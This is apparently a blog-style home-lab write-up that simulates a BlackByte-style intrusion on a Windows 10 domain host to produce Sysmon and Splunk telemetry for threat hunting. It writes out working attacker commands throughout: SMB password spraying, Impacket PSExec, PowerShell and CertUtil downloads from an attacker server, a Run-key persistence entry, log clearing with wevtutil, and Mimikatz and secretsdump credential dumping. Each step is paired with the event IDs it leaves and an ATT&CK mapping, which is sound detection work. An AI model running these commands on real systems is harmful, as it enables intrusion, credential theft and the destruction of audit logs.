### Overview

To build this lab, I simulated a multi-stage intrusion against a Windows 10 host (`PC01`, domain `mydfir.local`) modeled on Microsoft's BlackByte ransomware incident response case study. I executed every attacker action myself from a Kali Linux attack box, while Sysmon and native Windows Event Logs were forwarded in real time to a self-hosted Splunk instance.

The goal of this phase was to generate a realistic, fully-attributable telemetry dataset — one I would later hunt through cold, using only the logs, exactly as a SOC analyst would during an actual investigation. The attack chain below documents what I did and why, so the hunting phases that follow can be read independently against the evidence they uncover.

**Assumed breach scenario:** The attacker has already gained an initial foothold somewhere in the `mydfir.local` domain, harvested a set of domain credentials, and is now pivoting laterally to expand access.

**Environment:**

| Component | Detail |
| --- | --- |
| Target host | `PC01` (Windows 10) |
| Domain | `mydfir.local` |
| Target IP | `192.168.7.138` |
| Attacker infrastructure | Kali Linux, Python HTTP server at `192.168.7.250` |
| Telemetry pipeline | Sysmon → Splunk Universal Forwarder → Splunk |

---

### Phase 1 — Credential Spraying

**Tool:** `netexec` (formerly CrackMapExec) | **Protocol:** SMB

```bash
netexec smb 192.168.7.138 -u ibrahim -p passwords.txt -d mydfir
```

I sprayed a candidate password list against a known domain user account, `ibrahim`, over SMB.

**Result:** `mydfir\ibrahim:P@ssw0rd` — flagged `(Pwn3d!)`, confirming local admin rights on the target.

!image.png

**Artifacts this generates on the target:**

| Artifact | Event ID | Source |
| --- | --- | --- |
| Failed logon attempts (per password tried) | Security 4625 | Windows Security Log |
| Successful logon (Type 3, Network) | Security 4624 | Windows Security Log |
| NTLM credential validation | Security 4776 | Windows Security Log |
| Explicit credential logon (possible) | Security 4648 | Windows Security Log |

---

### Phase 2 — Lateral Movement via Impacket PSExec

**Tool:** `impacket-psexec` | **Credentials:** `mydfir.local/ibrahim:P@ssw0rd` | **Payload:** `cmd.exe`

```bash
impacket-psexec 'mydfir.local/ibrahim:P@ssw0rd@192.168.7.138' cmd.exe
```

!image.png

**What this actually does, step by step:**

1. Enumerates SMB shares on the target → finds the writable `ADMIN$` share
2. Uploads a randomly-named service binary, `MyMVPfXG.exe`, into `ADMIN$` (which maps to `C:\Windows`)
3. Opens the Service Control Manager (SCM) remotely
4. Creates and starts a new service named `DpYu`
5. The service executes the uploaded binary, dropping the attacker into an interactive `cmd.exe` shell on the remote host

```
[*] Requesting shares on 192.168.7.138         → SMB share enumeration
[*] Found writable share ADMIN$                → ADMIN$ access confirmed
[*] Uploading file MyMVPfXG.exe                → file drop into C:\Windows
[*] Opening SVCManager on 192.168.7.138         → remote SCM access
[*] Creating service DpYu on 192.168.7.138      → service installation
[*] Starting service DpYu                       → service execution
```

I chose to read each line of Impacket's verbose output as a separate forensic artifact rather than just a progress log — this mindset is what later let me reverse-engineer Impacket's actual naming logic (covered in the lateral movement hunting writeup).

**Artifacts generated:**

| Artifact | Event ID | Source | Note |
| --- | --- | --- | --- |
| SMB share access | Security 5140 | Windows Security Log | Requires GPO auditing enabled |
| File creation (`MyMVPfXG.exe`) | Sysmon 11 | Sysmon |  |
| Service installed | Security 4697 | Windows Security Log | Requires GPO auditing enabled |
| Service created | System 7045 | System Log |  |
| Process creation (payload) | Sysmon 1 | Sysmon |  |
| Process creation (payload) | Security 4688 | Windows Security Log | Requires GPO command-line auditing |
| Network logon | Security 4624 (Type 3) | Windows Security Log |  |

---

### Phase 3 — Discovery (Living Off the Land)

Once inside the shell, I ran standard reconnaissance using only native binaries — no additional tools:

```bash
whoami
hostname
ipconfig
systeminfo
```

**Why this matters for detection:** These are LOLBins — nothing new was dropped to disk. Every execution still generates process creation telemetry:

- Sysmon Event ID 1 — process creation with full command line
- Security Event ID 4688 — process creation (requires command-line auditing)

---

### Phase 4 — Ingress Tool Transfer (PowerShell IWR)

**Source:** Python HTTP server on my attacker box (`192.168.7.250`) | **File dropped:** `dghelper.dll` → `C:\Windows\System32`

!image.png

```powershell
powershell -c Invoke-WebRequest -Uri http://192.168.7.250/dghelper.dll -OutFile C:\Windows\System32\dghelper.dll
```

!image.png

**Why `System32`:** High binary density makes it a deliberately chosen blind spot — harder for a defender to spot one rogue DLL among hundreds of legitimate ones at a glance.

**Artifacts generated:**

| Artifact | Event ID | Source |
| --- | --- | --- |
| PowerShell process spawn | Sysmon 1 / Security 4688 | Sysmon / Windows |
| Script block logging | PowerShell 4104 | PowerShell Operational Log |
| Outbound HTTP connection | Sysmon 3 | Sysmon |
| File creation (`dghelper.dll`) | Sysmon 11 | Sysmon |
| DNS resolution (if domain used) | Sysmon 22 | Sysmon |

---

### Phase 5 — Persistence (Registry Run Key)

**Method:** `reg add` to the HKLM Run key | **Binary abused:** `rundll32.exe` (signed Microsoft binary)

```bash
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "rundll32.exe C:\Windows\System32\dghelper.dll,mainfunc" /f
```

!image.png

**Effect:** On every user logon, `rundll32.exe` loads `dghelper.dll` and calls its exported function `mainfunc`. Since `rundll32.exe` is a trusted, signed Microsoft binary, this blends into normal system activity rather than tripping binary-reputation-based detections.

**Artifacts generated:**

| Artifact | Event ID | Source |
| --- | --- | --- |
| Registry value set | Sysmon 13 | Sysmon |
| Registry modification | Security 4657 | Windows Security Log (requires registry auditing) |
| `rundll32.exe` execution on next logon | Sysmon 1 / Security 4688 | Sysmon / Windows |

---

### Phase 6 — Defense Evasion (Log Clearing)

**Tool:** `wevtutil`

```bash
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
```

!image.png

**Why this is largely ineffective against a centralized SIEM:** Clearing local logs does nothing to events already forwarded in real time to Splunk. To actually suppress collection, the attacker would need to kill the forwarder agent itself — a separate, independently detectable action. Additionally, the Windows Event Log service writes a dedicated event **immediately before** the target log is cleared, so the clearing action documents itself.

**Artifacts generated:**

| Artifact | Event ID | Source |
| --- | --- | --- |
| Security log cleared | Security 1102 | Windows Security Log |
| System log cleared | System 104 | System Log |
| Application log cleared | Application 104 | Application Log |
| `wevtutil.exe` process creation | Sysmon 1 / Security 4688 | Sysmon / Windows |

---

### Phase 7 — Credential Harvesting (CertUtil + Mimikatz)

### Step 1 — File transfer via CertUtil

```bash
certutil -urlcache -split -f http://192.168.7.250/mimikatz.exe C:\Windows\System32\mimi.exe
```

!image.png

!image.png

CertUtil is a certificate management utility being abused here purely as a download mechanism. One behavioral fingerprint I confirmed in my own web server logs: CertUtil's `-urlcache` mechanism generates **two HTTP requests** to the source URL for a single download — a distinguishing signature independent of file name or destination path.

### Step 2 — Mimikatz Execution

```bash
C:\Windows\System32\mimi.exe
privilege::debug
lsadump::sam
lsadump::secrets
sekurlsa::logonpasswords
```

!image.png

- `privilege::debug` — requests `SeDebugPrivilege` to access protected LSASS memory
- `lsadump::sam` — dumps local NTLM hashes from the SAM database
- `lsadump::secrets` — dumps cached domain credentials from LSA secrets

**Artifacts generated:**

| Artifact | Event ID | Source |
| --- | --- | --- |
| CertUtil process + command line | Sysmon 1 / Security 4688 | Sysmon / Windows |
| Two outbound HTTP requests | Sysmon 3 | Sysmon |
| `mimi.exe` file creation | Sysmon 11 | Sysmon |
| LSASS memory access | Sysmon 10 | Sysmon |
| Privilege escalation attempt | Security 4672 | Windows Security Log |

### Step 3 — Remote Secrets Dump

```bash
impacket-secretsdump mydfir.local/ibrahim:P@ssw0rd@192.168.7.138
```

!image.png

Run remotely from my attacker box — extracts SAM and LSA secrets over the network without requiring an interactive session on the target.

---

### Phase 8 — Cleanup Attempt (PSExec Teardown)

On session exit, Impacket PSExec automatically attempts cleanup:

- Stops service `DpYu`
- Deletes service `DpYu`
- Deletes the uploaded binary `MyMVPfXG.exe` from `ADMIN$`

**Observed in my lab:** Cleanup did not complete cleanly — the process hung and I had to cancel it manually. This is a realistic and common outcome, not a scripted failure. It means residual artifacts (the service registry key, possibly the binary itself) may remain on disk even after an attacker attempts to cover their tracks — a detail I exploit directly in the lateral movement hunting phase.

---

### Full Attack Chain

```
Credential Spray (NetExec / SMB)
        ↓
Lateral Movement (Impacket PSExec → MyMVPfXG.exe → Service DpYu)
        ↓
Discovery (whoami, ipconfig, systeminfo — LOLBins)
        ↓
Ingress Tool Transfer (PowerShell IWR → dghelper.dll → System32)
        ↓
Persistence (reg add → HKLM Run → rundll32 + dghelper.dll)
        ↓
Defense Evasion (wevtutil → clear Security/System/Application logs)
        ↓
Ingress Tool Transfer (CertUtil → mimi.exe)
        ↓
Credential Harvesting (Mimikatz → SAM dump + LSA secrets)
        ↓
Remote Credential Harvesting (impacket-secretsdump)
        ↓
Cleanup Attempt (partial failure — artifacts remain)
```

---

### ATT&CK Mapping

| Tactic | Technique | ID |
| --- | --- | --- |
| Credential Access | Brute Force: Password Spraying | T1110.003 |
| Lateral Movement | Remote Services: SMB/Windows Admin Shares | T1021.002 |
| Execution | System Services: Service Execution | T1569.002 |
| Discovery | System Information Discovery | T1082 |
| Discovery | System Network Configuration Discovery | T1016 |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 |
| Command & Control | Ingress Tool Transfer | T1105 |
| Persistence | Boot/Logon Autostart: Registry Run Keys | T1547.001 |
| Defense Evasion | Indicator Removal: Clear Windows Event Logs | T1070.001 |
| Defense Evasion | System Binary Proxy Execution: Rundll32 | T1218.011 |
| Credential Access | OS Credential Dumping: SAM | T1003.002 |
| Credential Access | OS Credential Dumping: LSA Secrets | T1003.004 |

---

### Logging Requirements

| Log Source | Covers |
| --- | --- |
| Windows Security Log (4624/4625/4688/5140) | Logons, process creation, share access |
| Sysmon (EID 1/3/10/11/13/22) | Process creation, network, file, registry, LSASS access |
| PowerShell Script Block Logging (EID 4104) | IWR and other PowerShell commands |
| System Log (7045) | Service creation |
| Windows Event Log (1102/104) | Log clearing events |

**Note:** Command-line auditing must be explicitly enabled via GPO for Security EID 4688 to capture process arguments. Without it, you see that `cmd.exe` started — but not what it was told to do.

---

### What I Took Away From Building This

- **Every attacker action has observable effects.** Even a credential spray over SMB leaves logon failure/success events on the target before a shell is ever obtained — Locard's Exchange Principle holds in digital forensics as much as physical.
- **LOLBins are still traceable.** `rundll32`, `certutil`, `wevtutil`, `reg`, PowerShell — every one of these is native and trusted, and every one still leaves process creation and command-line artifacts if you're logging for it.
- **Log clearing is a late-stage red flag, not an effective countermeasure.** Seeing EID 1102 or 104 in a SIEM should be treated as near-certain evidence of hands-on-keyboard attacker activity, not routine maintenance.
- **CertUtil's double HTTP request is a reliable behavioral fingerprint** — I confirmed this myself against my own web server logs, independent of file name or destination.
- **SIEM centralization is the actual control here**, not log permissions on the endpoint. Local log clearing was irrelevant the moment these events were forwarded — and the attacker's own cleanup attempt failed regardless.
- **Cleanup failure should be the expected case, not the exception.** I didn't script the PSExec cleanup to fail — it failed naturally, which is exactly what real-world incident response should assume going in.

---
